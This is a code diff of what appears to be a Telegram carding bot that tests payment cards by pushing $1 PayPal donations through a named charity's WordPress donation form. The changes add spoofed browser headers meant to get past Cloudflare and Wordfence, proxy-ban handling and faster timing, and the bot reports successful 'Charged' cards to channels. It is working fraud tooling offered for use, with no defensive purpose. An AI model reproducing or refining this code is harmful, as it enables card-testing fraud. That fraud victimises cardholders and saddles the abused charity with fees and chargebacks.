@@ -1,6 +1,6 @@
 # ==============================================================================
 # 𝐒𝐇𝐎𝐏𝐈𝐅𝐘 & 𝐏𝐀𝐘𝐏𝐀𝐋 𝐕𝐈𝐏 𝐁𝐎𝐓 - 𝐔𝐋𝐓𝐈𝐌𝐀𝐓𝐄 𝐏𝐑𝐎𝐃𝐔𝐂𝐓𝐈𝐎𝐍 𝐒𝐘𝐒𝐓𝐄𝐌 
-# (SMART SITE ROTATION, FORCED GIF DOWNLOADER, CHARGED FONT, ASYNC PAYPAL)
+# (STEALTH PAYPAL HEADERS, SMART SITE ROTATION, FORCED GIF, CHARGED FONT)
 # ==============================================================================
 import asyncio
 import aiohttp
@@ -48,6 +48,9 @@ JOIN_CHANNEL_LINK = os.getenv("JOIN_CHANNEL_LINK", "").strip()
 JOIN_GROUP_LINK = os.getenv("JOIN_GROUP_LINK", "").strip()
 HITS_GROUP_LINK = os.getenv("HITS_GROUP_LINK", "").strip()
 
+# ⚠️ إعداد بوابة PayPal (تقدر تغير الدومين من هنا إذا تعطل الموقع القديم)
+PAYPAL_DONATE_DOMAIN = "https://www.callahandogs.com"
+
 def get_valid_target(link, chat_id):
     l = str(link).strip()
     c = str(chat_id).strip()
@@ -69,10 +72,10 @@ CHECKER_API_URL = 'https://autosh.up.railway.app/shopii'
 GITHUB_SITES_URL = os.getenv("GITHUB_SITES_URL", "https://raw.githubusercontent.com/7Tqk/New-bot-tele/refs/heads/main/sites.txt")
 KEYS_FILE = "redeem_keys.json"
 
-WORKERS = 70  
+WORKERS = 15  
 API_TIMEOUT = 30  
-DELAY =2.0  
-HIT_DELAY = 1.5
+DELAY = 1.0  
+HIT_DELAY = 0.2
 
 _SITE_ERRORS_COUNT = {}
 _MAX_SITE_ERRORS = 3
@@ -220,8 +223,8 @@ async def fetch_gif_bytes(url):
                     bio = io.BytesIO(await resp.read())
                     bio.name = "animation.gif"
                     return bio
-    except Exception as e:
-        logger.error(f"Failed to fetch GIF from {url}: {e}")
+    except Exception:
+        pass
     return None
 
 async def styled_reply(update: Update, text: str, buttons=None, use_gif=True, specific_gif=None):
@@ -456,7 +459,7 @@ async def force_join_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await styled_reply(update, f"<b>{CE_FIRE} {sf('Access Denied')}</b>\n\n├ {sf('You must join our official channels first.')}\n╰ {sf('Please join, then click Verify.')}", buttons=kb, use_gif=True)
     return False
 
-# ====================== STRICT API FILTERING ======================
+# ====================== STRICT PAYPAL WITH STEALTH HEADERS ======================
 async def get_bin_info(bin_code):
     try:
         async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=5)) as session:
@@ -479,16 +482,37 @@ async def check_paypal_donate_api(card, proxy):
         if proxy_str and not proxy_str.startswith('http'): proxy_str = f"http://{proxy_str}"
 
         price = "1"
-        urll = "https://www.callahandogs.com/donate/"
-        ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
+        urll = f"{PAYPAL_DONATE_DOMAIN.rstrip('/')}/donate/"
+        
+        # 🌟 Stealth Headers to bypass Cloudflare/Wordfence
+        ua = random.choice([
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
+        ])
+        
+        headers_get = {
+            'User-Agent': ua,
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Connection': 'keep-alive',
+            'Upgrade-Insecure-Requests': '1',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'none',
+            'Sec-Fetch-User': '?1',
+            'Cache-Control': 'max-age=0'
+        }
 
         connector = aiohttp.TCPConnector(ssl=False)
         async with aiohttp.ClientSession(connector=connector, cookie_jar=aiohttp.DummyCookieJar()) as local_session:
-            headers_get = {'User-Agent': ua, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}
             async with local_session.get(urll, headers=headers_get, proxy=proxy_str, timeout=20) as r1:
                 text1 = await r1.text()
 
-            if r1.status != 200 or "<html" in text1.lower() and "callahan" not in text1.lower():
+            # Catch Proxy Bans / Cloudflare Pages
+            if r1.status in [403, 429, 502, 503] or "cloudflare" in text1.lower() or "just a moment" in text1.lower():
+                return {'status': 'Site Error', 'message': 'Cloudflare Blocked Proxy', 'card': card, 'retry': True}
+
+            if "<html" in text1.lower() and "give-form-hash" not in text1.lower():
                 return {'status': 'Site Error', 'message': 'Gateway Layout Error (About Home)', 'card': card, 'retry': True}
 
             try:
@@ -501,7 +525,7 @@ async def check_paypal_donate_api(card, proxy):
             except Exception:
                 return {'status': 'Site Error', 'message': 'Token Extraction Blocked', 'card': card, 'retry': True}
 
-            url2 = "https://www.callahandogs.com/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order"
+            url2 = f"{PAYPAL_DONATE_DOMAIN.rstrip('/')}/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order"
             payload2 = {
                 'give-honeypot': '', 'give-form-id-prefix': vaa2, 'give-form-id': vaa3,
                 'give-form-title': 'Make a Donation', 'give-current-url': urll, 'give-form-url': urll,
@@ -514,7 +538,9 @@ async def check_paypal_donate_api(card, proxy):
                 'card_city': 'Alkol', 'card_state': 'WV', 'card_zip': '25501', 'give-gateway': 'paypal-commerce'
             }
             
-            ajax_headers = {'User-Agent': ua, 'X-Requested-With': 'XMLHttpRequest'}
+            ajax_headers = headers_get.copy()
+            ajax_headers.update({'X-Requested-With': 'XMLHttpRequest'})
+            
             async with local_session.post(url2, data=payload2, headers=ajax_headers, proxy=proxy_str, timeout=20) as r2:
                 ajax_res = await r2.text()
                 if r2.status != 200 or "<html" in ajax_res.lower():
@@ -546,8 +572,8 @@ async def check_paypal_donate_api(card, proxy):
             if "<html" in resp_text.lower() or "doctype" in resp_text.lower():
                 return {'status': 'Site Error', 'message': 'PayPal Security Layout Intercepted', 'card': card, 'retry': True}
 
-            url4 = f"https://www.callahandogs.com/wp-admin/admin-ajax.php?action=give_paypal_commerce_approve_order&order={idd}"
-            async with local_session.post(url4, data=payload2, headers=headers_get, proxy=proxy_str, timeout=20) as r4:
+            url4 = f"{PAYPAL_DONATE_DOMAIN.rstrip('/')}/wp-admin/admin-ajax.php?action=give_paypal_commerce_approve_order&order={idd}"
+            async with local_session.post(url4, data=payload2, headers=ajax_headers, proxy=proxy_str, timeout=20) as r4:
                 try: j4 = await r4.json()
                 except: return {'status': 'Site Error', 'message': 'Final Layout Refused JSON', 'card': card, 'retry': True}
 
@@ -1171,7 +1197,7 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
                     if status == 'Charged':
                         chg += 1
                         asyncio.create_task(_send_mass_hit(card, gate_name, res.get('price', '-'), uid, c_el, bot))
-                        asyncio.create_task(_send_global_hit(gate_name, res.get('price', '-'), uid, bot, c_el))
+                        asyncio.create_task(_send_global_hit(gateway=gate_name, price=res.get('price', '-'), uid=uid, bot=bot, elapsed=c_el))
                     elif status == 'Approved':
                         app += 1
                     elif status == 'Insufficient':
